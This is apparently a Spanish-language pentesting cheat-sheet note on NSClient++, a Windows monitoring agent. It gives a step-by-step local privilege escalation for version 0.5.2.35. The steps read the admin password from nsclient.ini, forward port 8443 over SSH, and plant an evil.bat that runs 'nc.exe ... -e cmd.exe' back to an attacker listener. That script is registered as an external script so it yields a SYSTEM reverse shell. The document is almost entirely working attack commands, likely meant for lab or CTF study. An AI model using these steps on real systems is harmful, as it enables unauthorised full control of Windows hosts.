# NSClient 

Tags: #NSClient #Windows #Ligolo 

Es un **agente de monitoreo para Windows**.

Pensar en él como un "cliente" que instala el administrador del sistema para que un servidor de monitoreo (Nagios, Icinga, Centreon, etc.) pueda consultar remotamente el estado de la máquina.

- Normalmente corre como: NT AUTHORITY\SYSTEM

## Archivos de configuración 

```bash 
# Ruta de archivos de configuración:
C:\Program Files\NSClient++\

# Archivo:
	- nsclient.ini    # Leer la contraseña de administrador 
	- nsclient.log
```

## Versión 0.5.2.35 vulnerable  - Local PrivEsc

* [PrivEsc](https://www.exploit-db.com/exploits/46802)

```bash 
❯ nscp.exe --version       # Conocer la versión 
```

```bash 
Paso 1:
# Leer la contraseña de administrador 
❯ type C:\Program Files\NSClient++\nsclient.ini   
o
# Dentro de 'C:\Program Files\NSClient++\' ejecutar el siguiente comando:
❯ nscp web -- password --display    

Donde:
	WEBServer = enabled
	allowed hosts = 127.0.0.1
```

```bash 
# Verificar en nmap que corre el servicio con HTTPS en la web para el ingreso de la password encontrada 
	
	8443/tcp  open  ssl/https-alt


NOTA:
	- Para que permita el ingreso a la aplicación se debe de hacer un 'Local Port Forwarding' con el fin de que el server piense que se hace la petición de manera interna de lo contrario mostrara un '403 Your not allowed' 
```

```bash 
Paso 2: (Opcional si arriba menciona que se ejecuta de manera local)
# Crear un LocalPortForwarding desde Kali 
❯ sshpass -p 'pass123' ssh user@IP -L 8443:127.0.0.1:8443
	# -L [PUERTO_EN_TU_KALI] : [IP_VISTA_DESDE_LA_MÁQUINA_REMOTA] : [PUERTO_REMOTO]


# Verificar la conexión 
❯ ss -ltnp | grep 8443
❯ netstat -ltnp | grep 8443


NOTA:
	- Abrir en el navegador como:    
		  https://localhost:8443          # Para que se aplique el 'Local Port Forwarding' 
	- Verificar el la aplicaación que lo siguiente este activado:
		  - CheckExternalScripts
		  - Scheduler
```

* [Netcat](https://eternallybored.org/misc/netcat/)

```bash 
Paso 3:
# Subir nc.exe y evil.bat a 'C:\Temp' desde Kali 

# Contenido de evil.bat 
	@echo off
	c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe


Paso 4: 
❯ rlwrap nc -nlvp 443    # Ponerse en escucha en Kali 
```

```bash 
Paso 5:
# Hacer los siguientes pasos en la plataforma:
- Settings > External Scripts > Scripts
- Add New
	- foobar (key) = Reverse
		command (value) = c:\temp\evil.bat

# Guardar los cambios en:
- Changes 
	- Save configuration 


Paso 6: 
# Hacer lo siguiente:
- Control
	- Reload 

# Al terminar de reiniciar ir a 'Queries' para que se establezca la conexión con nuestro Kali 
```
